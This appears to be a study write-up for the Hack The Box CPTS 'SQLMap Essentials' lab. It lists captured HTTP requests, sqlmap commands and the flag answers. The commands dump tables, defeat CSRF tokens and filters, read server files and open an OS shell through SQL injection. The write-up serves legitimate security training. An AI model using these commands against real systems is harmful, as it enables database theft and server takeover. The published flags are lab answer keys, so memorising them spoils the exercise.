---
title: CPTS labs - 17 SQLMap Essentials
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 17 SQLMap Essentials

## [SQLMap Essentials](https://academy.hackthebox.com/module/details/58)

### Building Attacks

**What's the fastest SQLi type?**

Results: UNION query-based


**What's the contents of table flag2? (Case #2)**

```bash
sqlmap -r r  -T flag2 --dump --batch
```

Results: HTB{700_much_c0n6r475_0n_p057_r3qu357}



**What's the contents of table flag3? (Case #3)**

We save the following request:

```bash
GET /case3.php HTTP/1.1
Host: 94.237.54.116:55862
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.54.116:55862/case3.php
Cookie: id=*
Upgrade-Insecure-Requests: 1

```

We have modified the Cookie to `Cookie: id=*` to indicate we want to test this value:

```bash
sqlmap -r r  -T flag3 --dump --batch
```

Results: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}



**What's the contents of table flag4? (Case #4)**

We save the following request:

```bash
POST /case4.php HTTP/1.1
Host: 94.237.54.116:55862
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.54.116:55862
Connection: keep-alive
Referer: http://94.237.54.116:55862/case4.php

{"id":1}

```

And now:

```bash
sqlmap -r r4 -T flag4 --dump --batch
```

Results: HTB{j450n_v00rh335_53nd5_6r475}


**What's the contents of table flag5? (Case #5)**

We capture the request and save under name r5:

```bash
GET /case5.php?id=1 HTTP/1.1
Host: 94.237.63.92:51270
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.63.92:51270/case5.php
Cookie: filemanager=4umv9nhasf1ebkuap971gk9jae
Upgrade-Insecure-Requests: 1

```

And now we elevate the risk: 

```bash
sqlmap -r r5  -T flag5 --dump  -p id --batch --level=5 --risk=3 
```

Results: HTB{700_much_r15k_bu7_w0r7h_17}



**What's the contents of table flag6? (Case #6)**

We capture the request and save under name r6:

```bash
GET /case6.php?col=id HTTP/1.1
Host: 94.237.63.92:51270
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.63.92:51270/case6.php
Cookie: filemanager=4umv9nhasf1ebkuap971gk9jae
Upgrade-Insecure-Requests: 1

```

And now we use the following prefix: 

```bash
sqlmap -r r6 --batch --dump -T flag6 --level=5 --risk=3 --prefix='`)'  
```

Results: HTB{v1nc3_mcm4h0n_15_4570n15h3d}


**What's the contents of table flag7? (Case #7)**

We capture the request and save under name r7:

```bash
GET /case7.php?id=1 HTTP/1.1
Host: 94.237.63.92:51270
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.63.92:51270/case7.php
Cookie: filemanager=4umv9nhasf1ebkuap971gk9jae
Upgrade-Insecure-Requests: 1


```

The  `--no-cast` flag disables automatic type casting of data. When enabled, `sqlmap` tries to cast data types (e.g., converting strings to integers), which might not be necessary or could lead to incorrect results. Disabling it can sometimes provide more accurate outcomes.

```bash
sqlmap -r r7 --batch --dump -T flag7 --level=5 --risk=3 -p id --technique=U --fresh-queries  --union-cols=5 --no-cast
```

Results: HTB{un173_7h3_un173d}



### Database Enumeration

We capture the request and save under name r1:

```bash
GET /case1.php?id=1 HTTP/1.1
Host: 94.237.63.92:51270
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.63.92:51270/case1.php
Cookie: filemanager=4umv9nhasf1ebkuap971gk9jae
Upgrade-Insecure-Requests: 1


```


```bash
sqlmap -r r1 --batch --dump 
```

Results:  HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}


**What's the name of the column containing "style" in it's name? (Case #1)**

We capture the request and save under name r1:

```bash
GET /case1.php?id=1 HTTP/1.1
Host: 94.237.63.92:51270
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.63.92:51270/case1.php
Cookie: filemanager=4umv9nhasf1ebkuap971gk9jae
Upgrade-Insecure-Requests: 1


```

We can dump all and read the output: 

```bash
sqlmap -r r1 --batch --dump-all 
```

Or we can narrow our search:

```bash
sqlmap -r r1 --search -C style --batch
```

Results: PARAMETER_STYLE


**What's the Kimberly user's password? (Case #1)**

We can dump all and read the output: 

```bash
sqlmap -r r1 --batch --dump-all   --exclude-sysdbs
```

Or narrow our search:

```bash
sqlmap -r r1 --dump --columns --where="name LIKE 'Kimberly%'" --batch
```


### Advanced SQLMap Usage

**What's the contents of table flag8? (Case #8)**

We capture the request and save under name r8:

```bash
POST /case8.php HTTP/1.1
Host: 94.237.52.110:38973
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://94.237.52.110:38973
Connection: keep-alive
Referer: http://94.237.52.110:38973/case8.php
Cookie: PHPSESSID=lk2ocjdbcss24spch123ethmn5
Upgrade-Insecure-Requests: 1

id=1&t0ken=D7e111IQPQejRSZKiOjZ8qNYuvgEUIfHXVavtbd3I
```

We infer that the parameter t0ken is a csrf-token protection:

```bash
sqlmap -r r8 --dump -T flag8 --csrf-token=t0ken --batch
```

Results:  HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} 


**What's the contents of table flag9? (Case #9)**

We capture the request and save under name r9:

```bash
GET /case9.php?id=1&uid=3343645612 HTTP/1.1
Host: 94.237.52.110:38973
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.52.110:38973/case9.php
Cookie: PHPSESSID=lk2ocjdbcss24spch123ethmn5
Upgrade-Insecure-Requests: 1


```

Now we randomize the uid parameter: 

```bash
sqlmap -r r9 --dump -T flag9 --randomize=uid  --batch
```

Results: HTB{700_much_r4nd0mn355_f0r_my_74573}


**What's the contents of table flag10? (Case #10)**

We capture the request and save under name r10:

```bash
POST /case10.php HTTP/1.1
Host: 94.237.52.110:38973
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Origin: http://94.237.52.110:38973
Connection: keep-alive
Referer: http://94.237.52.110:38973/case10.php
Cookie: PHPSESSID=lk2ocjdbcss24spch123ethmn5
Upgrade-Insecure-Requests: 1

id=1
```

We just need to indicate the vulnerable parameter:

```bash
sqlmap -r r10 --dump -T flag10 -p id --batch
```

Results: HTB{y37_4n07h3r_r4nd0m1z3}


**What's the contents of table flag11? (Case #11)**

We capture the request and save under name r11:

```bash
GET /case11.php?id=1 HTTP/1.1
Host: 94.237.52.110:38973
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.52.110:38973/case11.php
Cookie: PHPSESSID=lk2ocjdbcss24spch123ethmn5
Upgrade-Insecure-Requests: 1


```

By looking at the enunciation at the webapp, we know that there is some filtering with `<` and `>`, so we will use a tamper:

```bash
sqlmap -r r11 --dump -T flag11 -p id --tamper=greatest
```

Results: HTB{5p3c14l_ch4r5_n0_m0r3}


**Try to use SQLMap to read the file "/var/www/html/flag.txt".**

We capture the request and save under name rfinal:

```bash
GET /?id=1 HTTP/1.1
Host: 83.136.250.116:51490
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://83.136.250.116:51490/
Upgrade-Insecure-Requests: 1


```

Now, we check out if we are dbadmin. If positive, then we read the /var/www/html/flag.txt. 

```bash
sqlmap -r rfinal -p id --is-dba
sqlmap -r rfinal --file-read "/var/www/html/flag.txt"

cd /home/username/.local/share/sqlmap/output/83.136.250.116/files
ls -la
cat _var_www_html_flag.txt
```

Results: HTB{5up3r_u53r5_4r3_p0w3rful!}


**Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.**

```bash
sqlmap -r rfinal --os-shell 
# Options: 2, 4, 1

ls -la /
cat /flag.txt
```




### Skills Assessment

You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

**What's the contents of table final_flag?**

After browsing around, we find this request and save it under name rass:

```bash
POST /action.php HTTP/1.1
Host: 94.237.52.110:48833
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.52.110:48833
Connection: keep-alive
Referer: http://94.237.52.110:48833/shop.html
Cookie: PHPSESSID=lk2ocjdbcss24spch123ethmn5

{"id":1}
```

After playing with several payloads, we find that the --tamper=between worked it out:

```bash
sqlmap -r rass -p id --dump-all --exclude-sysdbs --tamper=between --batch
```

Results:  HTB{n07_50_h4rd_r16h7?!} 

